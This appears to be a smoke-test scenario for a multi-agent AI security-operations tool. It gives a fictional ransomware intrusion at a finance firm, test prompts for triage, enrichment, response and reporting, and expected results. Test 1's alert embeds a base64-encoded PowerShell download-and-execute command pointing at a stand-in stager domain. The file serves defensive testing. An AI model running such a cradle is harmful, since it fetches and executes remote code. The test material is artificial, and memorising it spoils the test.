# Operation Frozen Ledger — HOOK Smoke Test Scenario

## Scenario Overview

A multi-stage intrusion targeting a financial services firm. The attack chain progresses through:
1. **Phishing** — Spearphishing email with macro-enabled document
2. **Execution** — PowerShell stager downloads Cobalt Strike beacon
3. **C2** — HTTPS beaconing to attacker infrastructure
4. **Credential Dumping** — Mimikatz via process injection
5. **Lateral Movement** — RDP + PsExec to domain controller
6. **Ransomware** — LockBit deployment across the domain

## Test Prompts

### Test 1: Basic Triage (Triage Analyst)
```
Triage this Sentinel alert:

AlertName: Suspicious PowerShell Command
Severity: High
TimeGenerated: 2026-02-27T14:23:15Z
CompromisedEntity: WKSTN-FIN-042
AlertType: VM_AmMalware
Entities:
  - Host: WKSTN-FIN-042 (10.20.30.42)
  - Account: jsmith@contoso.com
  - Process: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAtAGMAaABlAGMAawAuAGYAaQBuAGEAbgBjAGUALQBwAG8AcgB0AGEAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA
  - FileHash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  - IP: 45.77.65.211 (destination)
```

### Test 2: IOC Enrichment (OSINT Researcher)
```
Enrich the following IOCs from a suspected intrusion:
- IP: 45.77.65.211 (C2 callback destination)
- Domain: update-check.finance-portal.com (stager download)
- Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Provide full enrichment from all available sources.
```

### Test 3: Incident Response (Incident Responder)
```
We have a confirmed intrusion on WKSTN-FIN-042 (10.20.30.42) in our finance department.
- Cobalt Strike beacon detected, beaconing to 45.77.65.211
- Credential dumping observed (Mimikatz signatures in memory)
- Lateral movement to DC-01 (10.20.30.10) via PsExec
- Environment: Microsoft Sentinel + Defender for Endpoint + Entra ID
- 500 employees, PCI-DSS compliant
What are the immediate containment and response steps?
```

### Test 4: Threat Intelligence (Threat Intel)
```
Analyze the following attack chain and provide attribution assessment:
- Initial vector: Spearphishing to finance department
- Payload: Macro-enabled .docm → PowerShell stager → Cobalt Strike
- C2: HTTPS beacon to Vultr VPS (45.77.65.211)
- Post-exploitation: Mimikatz, PsExec lateral movement
- Objective: Ransomware (LockBit variant)
- Target: Financial services firm
Use ACH to assess likely threat groups.
```

### Test 5: Report Generation (Report Writer)
```
Using the following findings, write an incident summary for the CISO:
- Incident: Ransomware attempt on Contoso Financial
- Timeline: Phishing email at 14:00 UTC → Execution at 14:23 → C2 at 14:25 → Lateral movement at 15:10 → Ransomware blocked at 15:45
- Impact: 1 workstation compromised, DC accessed, ransomware deployment blocked before encryption
- Response: Host isolated, credentials rotated, C2 blocked at firewall
- Status: Contained, eradication in progress
```

### Test 6: Full Chain (Coordinator Routing)
```
We just got this Sentinel alert. Please investigate fully — triage it, enrich all IOCs, give me IR guidance, and write a summary for management.

AlertName: Multi-stage Attack Detected
Severity: Critical
Entities:
  - Host: WKSTN-FIN-042 (10.20.30.42)
  - Account: jsmith@contoso.com
  - C2 IP: 45.77.65.211
  - Domain: update-check.finance-portal.com
  - Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  - Lateral Movement Target: DC-01 (10.20.30.10)
```

## Expected Behaviors

| Test | Agent(s) | Key Validation |
|------|----------|----------------|
| 1 | triage-analyst | Correct verdict, base64 decode, ATT&CK mapping |
| 2 | osint-researcher | VT + Censys + AbuseIPDB calls succeed, structured output |
| 3 | incident-responder | NIST 800-61 steps, platform-specific Defender/Sentinel guidance |
| 4 | threat-intel | ACH matrix, attribution with confidence levels |
| 5 | report-writer | CISO-appropriate language, no jargon, clear impact |
| 6 | coordinator | Correct routing to multiple agents, chained workflow |

## IOCs for Reference

| IOC | Type | Expected Result |
|-----|------|----------------|
| 45.77.65.211 | IP | Vultr VPS, likely clean VT score (legitimate hosting), check Censys for services |
| update-check.finance-portal.com | Domain | Likely not in VT (test domain), check DNS resolution |
| e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | SHA256 | This is the SHA256 of an empty string — used as test placeholder |

> Note: The hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 is the SHA256 of empty input. In a real scenario, replace with actual malware hashes for testing.
